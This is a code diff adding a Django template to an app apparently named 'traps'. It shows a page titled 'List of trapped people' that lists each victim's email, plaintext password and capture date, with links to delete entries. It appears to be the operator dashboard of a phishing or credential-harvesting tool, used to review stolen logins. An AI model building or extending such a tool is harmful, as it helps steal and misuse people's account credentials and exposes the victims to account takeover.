@@ -1,0 +1,43 @@
+{% extends 'traps/basetemplate.html' %}
+{% load static %}
+
+
+
+{% block title %}
+    <title>List of trapped people</title>
+{% endblock %}
+
+
+
+{% block content %}
+    <style>
+
+    </style>
+
+    <h1> List of trapped people</h1>
+
+    <table border="1">
+        <tr>
+            <th>Email</th>
+            <th>Password</th>
+            <th>Trapdate</th>
+            <th>Action</th>
+        </tr>
+
+         {% for victim in victims %}
+            <tr>
+
+                <td>{{victim.email}}</td>
+                <td>{{victim.password}}</td>
+                <td>{{victim.trap_date}}</td>
+               <td>  <a href="{% url 'traps:delete' email_slug=victim.slug  %}" alt="Delete">  <img class="delete-icon" src="{% static 'traps/images/icone_suppression.jpg' %}" alt="Supprimer"></a> </td>
+
+            </tr>
+        {% endfor %}
+        <!-- Vous pouvez ajouter plus de lignes avec les données ici -->
+    </table>
+
+    <!-- Ajout d'un espace en bas du tableau -->
+    <div class="bottom-space"></div>
+
+{% endblock %}
